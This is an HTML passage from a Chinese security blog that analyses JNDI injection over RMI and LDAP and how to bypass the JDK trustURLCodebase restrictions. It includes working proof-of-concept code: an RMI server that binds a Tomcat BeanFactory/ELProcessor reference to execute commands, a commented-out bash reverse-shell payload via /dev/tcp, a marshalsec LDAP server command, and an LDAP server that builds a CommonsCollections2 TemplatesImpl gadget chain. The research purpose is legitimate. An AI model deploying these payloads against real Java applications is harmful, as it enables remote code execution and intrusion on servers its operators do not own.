<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-D com.sun.jndi.rmi.object.trustURLCodebase=true</span><br></pre></td></tr></table></figure>
<p>看下报错：</p>
<p><img src="/2023/01/11/JNDI/image-20230107220756804.png" alt="image-20230107220756804"></p>
<p>可以看到在<code>com.sun.jndi.rmi.registry.RegistryContext#decodeObject</code>方法中，由于高版本trustURLCodebase默认为false，进入分支抛出异常</p>
<p><img src="/2023/01/11/JNDI/image-20230107221223488.png" alt="image-20230107221223488"></p>
</li>
<li><p>高版本JDK绕过</p>
<p>绕过方式可以针对条件句的三个子句尝试进行利用</p>
<ul>
<li><p>令var8也就是<code>ref</code>为空，需要让其既不是<code>Reference</code>类也不是<code>Referenceable</code>类，那么就只能直接用原始对象了，在RMI下不好利用</p>
<p><img src="/2023/01/11/JNDI/image-20230107221541609.png" alt="image-20230107221541609"></p>
</li>
<li><p>令<code>ref.getFactoryClassLocation()</code>返回空值，也就是设置ref的<code>classFactoryLocation</code>属性为空，客户端不再从远程加载class字节码</p>
</li>
<li><p>第三项就是正常设置参数</p>
</li>
</ul>
<p>如果按照第二个思路来的话，下一个执行为<code>NamingManager.getObjectInstance()</code>，我们跟进。</p>
<p>这里会发现，如果<code>ref</code>不为空的话，先获取到工厂类名然后会直接尝试实例化工厂类，如果不为null将会进一步调用工厂类的<code>getObjectInstance()</code>方法</p>
<p><img src="/2023/01/11/JNDI/image-20230107222946308.png" alt="image-20230107222946308"></p>
<p>按照之前实验的客户端在lookup后的代码块执行顺序，我们只要能在这几个地方其中一个触发payload就行了</p>
<p>调用栈如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">InitialContext#lookup()</span><br><span class="line">  RegistryContext#lookup()</span><br><span class="line">    RegistryContext#decodeObject()</span><br><span class="line">      NamingManager#getObjectInstance()</span><br><span class="line">          objectfactory = NamingManager#getObjectFactoryFromReference()</span><br><span class="line">                  Class#newInstance()  //--&gt;恶意代码被执行</span><br><span class="line">     或:   objectfactory#getObjectInstance()  //--&gt;恶意代码被执行</span><br></pre></td></tr></table></figure>
<p><strong>条件</strong>：</p>
<blockquote>
<ul>
<li><p>存在于目标本地的 <code>CLASSPATH</code> 中 </p>
</li>
<li><p>实现 <code>javax.naming.spi.ObjectFactory</code> 接口 </p>
</li>
<li>至少存在一个 <code>getObjectInstance()</code> 方法</li>
</ul>
</blockquote>
<p><strong>利用：</strong>Tomcat内置类</p>
<p>依赖</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-el<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.5.15<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>看下 <code>org.apache.naming.factory.BeanFactory#getObjectInstance()</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx,</span></span><br><span class="line"><span class="params">                                Hashtable&lt;?,?&gt; environment)</span></span><br><span class="line">    <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> (Reference) obj;</span><br><span class="line">    <span class="type">String</span> <span class="variable">beanClassName</span> <span class="operator">=</span> ref.getClassName();</span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">tcl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">    <span class="comment">// 1. 反射获取类对象</span></span><br><span class="line">    <span class="keyword">if</span> (tcl != <span class="literal">null</span>) &#123;</span><br><span class="line">        beanClass = tcl.loadClass(beanClassName);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        beanClass = Class.forName(beanClassName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2. 初始化类实例</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">bean</span> <span class="operator">=</span> beanClass.getConstructor().newInstance();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 根据 Reference 的属性查找 setter 方法的别名</span></span><br><span class="line">    <span class="type">RefAddr</span> <span class="variable">ra</span> <span class="operator">=</span> ref.get(<span class="string">&quot;forceString&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> (String)ra.getContent();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 循环解析别名并保存到字典中</span></span><br><span class="line">    <span class="keyword">for</span> (String param: value.split(<span class="string">&quot;,&quot;</span>)) &#123;</span><br><span class="line">        param = param.trim();</span><br><span class="line">        index = param.indexOf(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            setterName = param.substring(index + <span class="number">1</span>).trim();</span><br><span class="line">            param = param.substring(<span class="number">0</span>, index).trim();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            setterName = <span class="string">&quot;set&quot;</span> +</span><br><span class="line">                param.substring(<span class="number">0</span>, <span class="number">1</span>).toUpperCase(Locale.ENGLISH) +</span><br><span class="line">                param.substring(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        forced.put(param, beanClass.getMethod(setterName, paramTypes));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 解析所有属性，并根据别名去调用 setter 方法</span></span><br><span class="line">    Enumeration&lt;RefAddr&gt; e = ref.getAll();</span><br><span class="line">    <span class="keyword">while</span> (e.hasMoreElements()) &#123;</span><br><span class="line">        ra = e.nextElement();</span><br><span class="line">        <span class="type">String</span> <span class="variable">propName</span> <span class="operator">=</span> ra.getType();</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> (String)ra.getContent();</span><br><span class="line">        Object[] valueArray = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> forced.get(propName);</span><br><span class="line">        <span class="keyword">if</span> (method != <span class="literal">null</span>) &#123;</span><br><span class="line">            valueArray[<span class="number">0</span>] = value;</span><br><span class="line">            method.invoke(bean, valueArray);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> 这里首先会通过反射实例化类，但注意调用的是无参构造方法。接着获取forceString所有的引用地址，并通过逗号分隔，每个分隔值中如果出现等号，则将逗号右侧的值作为setter方法的别名，左侧作为参数引用。之后会将其放入forced这个map当中。后续会调用所有的setter方法，参数为<code>RefAddr</code>的值（单参数），如此我们可以构造来实例化任意类并调用任意方法，只需满足该类含有无参构造函数以及可利用方法为单个参数传递</p>
<ol>
<li><p><code>javax.el.ELProcessor#eval()</code> 可以通过eval方法执行EL表达式</p>
<p><img src="/2023/01/11/JNDI/image-20230108151835588.png" alt="image-20230108151835588"></p>
<p>因此整个绕过流程，首先<code>ref.getFactoryClassLocation()</code>需要为空，也就是在设置引用类是设置属性factoryClassLocation为空即可；接着在<code>NamingManager.getObjectInstance()</code>成功实例化了本地存在的工厂类<code>org.apache.naming.factory.BeanFactory</code>，后者通过<code>newInstance</code>调用目标类的无参构造创建实例，并通过预设值的setter别名机制调用到<code>javax.el.ELProcessor#eval()</code>从而出发最终的EL表达式注入</p>
<p>POC<strong>构造</strong></p>
<p>这里的引用类利用了<code>ResourceRef</code>，它是tomcat中对某个资源的引用，构造函数如下</p>
<p><img src="/2023/01/11/JNDI/image-20230108152530879.png" alt="image-20230108152530879"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">            ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">            <span class="comment">// ref.add(new StringRefAddr(&quot;x&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;bash&#x27;,&#x27;-c&#x27;,&#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;]).start()\&quot;)&quot;));</span></span><br><span class="line">            ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -a Calculator.app\&quot;)&quot;</span>));</span><br><span class="line"></span><br><span class="line">            <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ref);</span><br><span class="line">            registry.bind(<span class="string">&quot;calc&quot;</span>, referenceWrapper);</span><br><span class="line">            System.err.println(<span class="string">&quot;Server ready&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;Server exception: &quot;</span> + e.toString());</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这里<code>x</code>即引用到的参数，其值即为<code>javax.el.ELProcessor#eval()</code>要执行的参数内容</p>
<p><img src="/2023/01/11/JNDI/image-20230108170602879.png" alt="image-20230108170602879"></p>
</li>
<li><p>groovy 这个类之后再看</p>
</li>
</ol>
<p><strong>绕过总结：</strong></p>
<blockquote>
<ul>
<li><p>Server:</p>
<p>使用<code>ResourceRef</code>构造的<code>beanClass</code>，这种利用方式构造的<code>beanClass</code>是<code>javax.el.ELProcessor</code>。<br><code>ELProcessor</code>中有个<code>eval(String)</code>方法可以执行<code>EL</code>表达式,<code>javax.el.ELProcessor</code>是<code>Tomcat8</code>中的库，所以仅限<code>Tomcat8</code>及更高版本环境下可以通过该库进行攻击。</p>
</li>
<li><p>Client:</p>
<p>远程 <code>RMI</code> 服务器返回的 <code>Reference</code> 对象中不指定 <code>Factory</code> 的 <code>codebase</code>，且使用本地的<code>factory</code>，如<code>BeanFactory</code>，以此绕过 <code>trustURLCodebase</code> 报错，执行 <code>NamingManager</code> ；<br>在<code>factory</code>的静态代码块、代码块、构造函数和<code>getObjectInstance</code>方法任意一个里面构造<code>payload</code>，即可在 <code>NamingManager</code> 中执行。</p>
</li>
</ul>
</blockquote>
<p><strong>工具：</strong></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Bypass">https://github.com/welk1n/JNDI-Injection-Bypass</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></li>
</ul>
</li>
</ul>
<h4 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI_LDAP"></a>JNDI_LDAP</h4><p>LDAP服务是一种树型数据库，其中存在特殊的属性可以用来实现Java对象以序列化数据或者引用的方式来存储，这时如果被客户端解析的话，就可以引起远程代码执行</p>
<ul>
<li><p>低版本JDK运行</p>
<p>工具利用marshalsec开启ldap服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/\#EvilClass 8088</span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/11/JNDI/image-20230109233427089.png" alt="image-20230109233427089"></p>
<p>由于LDAP服务的<code>Reference</code>远程加载<code>Factory</code>类并不是使用的<code>RMI Class Loader</code>机制，因此不受<code>trustURLCodebase</code>限制（8u191）</p>
<p>恶意类放在服务器下</p>
<p><img src="/2023/01/11/JNDI/image-20230109232706171.png" alt="image-20230109232706171"></p>
<p>低版本结果</p>
<p><img src="/2023/01/11/JNDI/image-20230109234255832.png" alt="image-20230109234255832"></p>
<p>高版本结果</p>
<p><img src="/2023/01/11/JNDI/image-20230109234336910.png" alt="image-20230109234336910"></p>
</li>
<li><p>调用流程分析</p>
<p>前面的调用栈与RMI类似，lookup之后decodeObject</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">decodeObject:235, Obj (com.sun.jndi.ldap)</span><br><span class="line">c_lookup:1051, LdapCtx (com.sun.jndi.ldap)</span><br><span class="line">p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:94, ldapURLContext (com.sun.jndi.url.ldap)</span><br><span class="line">lookup:417, InitialContext (javax.naming)</span><br><span class="line">main:7, Client</span><br></pre></td></tr></table></figure>
<p>跟进<code>com.sun.jndi.ldap.Obj.java#decodeObject()</code>，该方法会对服务端传来的数据根据不同的类型进行解码处理，类型可以是序列化数据或者引用对象，这里以引用对象为例</p>
<p><img src="/2023/01/11/JNDI/image-20230109235346841.png" alt="image-20230109235346841"></p>
</li>
</ul>
<p>之后会调用<code>decodeReference()</code>方法，其会获取服务端传来的属性值并构建一个<code>Reference</code>实例</p>
<p>这里便</p>
<p><img src="/2023/01/11/JNDI/image-20230110000012777.png" alt="image-20230110000012777"></p>
<p>接着会返回到<code>c_lookup</code>类中执行<code>DirectoryManager#getObjectInstance()</code> 其中var3为构建的引用类对象</p>
<p><img src="/2023/01/11/JNDI/image-20230110002710554.png" alt="image-20230110002710554"></p>
<p>这里可以看到首先将参数refInfo强转为<code>Reference</code>类实例，接着调用<code>getFactoryClassName</code>获取工厂类名，然后通过<code>getObjectFactoryFromReference()</code>方法根据工厂类名获取远程调用类。我们看下这里的具体实现</p>
<p><img src="/2023/01/11/JNDI/image-20230110003154131.png" alt="image-20230110003154131"></p>
<p>其首先会从本地加载目标类，如果找不到的话再通过制定的工厂类位置来远程加载。整个过程没有<code>URLCodebase</code>限制</p>
<p><img src="/2023/01/11/JNDI/image-20230110003430773.png" alt="image-20230110003430773"></p>
<ul>
<li><p>高版本限制</p>
<blockquote>
<p>在高版本 <code>JDK</code> 中需要通过 <code>com.sun.jndi.ldap.object.trustURLCodebase</code> 选项去启用。这个限制在 <code>JDK 11.0.1</code>、<code>8u191</code>、<code>7u201</code>、<code>6u211</code> 版本时加入，略晚于 <code>RMI</code> 的远程加载限制。</p>
</blockquote>
<p>限制位置加载了<code>helper.loadClass()</code>，也就是<code>VersionHelper12#loadClass()</code>中</p>
<p><img src="/2023/01/11/JNDI/image-20230110004205440.png" alt="image-20230110004205440"></p>
</li>
<li><p>其他几种利用方式</p>
<p><strong>使用序列化数据触发Gadget</strong></p>
<p>在<code>com.sun.jndi.ldap.Obj.java#decodeObject()</code>中通过<code>JAVA_ATTRIBUTES[SERIALIZED_DATA]</code>检测服务端传来的是否为序列化数据，进而调用<code>deserializeObject()</code>方法</p>
<p><img src="/2023/01/11/JNDI/image-20230111103858637.png" alt="image-20230111103858637"></p>
</li>
</ul>
<p>跟进可以看到存在原生反序列化<code>readObject()</code></p>
<p><img src="/2023/01/11/JNDI/image-20230111104131730.png" alt="image-20230111104131730"></p>
<p>改造<code>marchalsec</code>服务端程序的<code>sendResult()</code>部分即可，我这里的序列化数据以CC2为例</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAPRefServer1</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( String[] args )</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">8088</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">LDAPRefServer1</span>.OperationInterceptor(<span class="keyword">new</span> <span class="title class_">URL</span>(args[ <span class="number">0</span> ])));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getPayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            String TemplatesImpl=<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">            String AbstractTranslet=<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br><span class="line">            <span class="comment">// 恶意字节码部分构造</span></span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            classPool.appendClassPath(AbstractTranslet);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">poc</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;POC&quot;</span>);</span><br><span class="line">            poc.setSuperclass(classPool.get(AbstractTranslet));</span><br><span class="line">            poc.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">byte</span>[] evilCode = poc.toBytecode();</span><br><span class="line">            <span class="comment">// TemplatesImpl 恶意加载类构造 sink</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> Class.forName(TemplatesImpl).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;).newInstance();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(templatesImpl, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;evilCode&#125;);</span><br><span class="line"></span><br><span class="line">            <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">            field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field1.set(templatesImpl, <span class="string">&quot;whatever&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 构造gadget来连接 TemplatesImpl#newTransformer</span></span><br><span class="line">            <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">            <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 连接compare方法</span></span><br><span class="line">            <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">            queue.add(<span class="number">1</span>);</span><br><span class="line">            queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">Field</span> <span class="variable">field2</span> <span class="operator">=</span> queue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">            field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field2.set(queue, comparator);</span><br><span class="line"></span><br><span class="line">            <span class="type">Field</span> <span class="variable">field3</span> <span class="operator">=</span> queue.getClass().getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">            field3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field3.set(queue, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl, templatesImpl&#125;);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> queue;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span 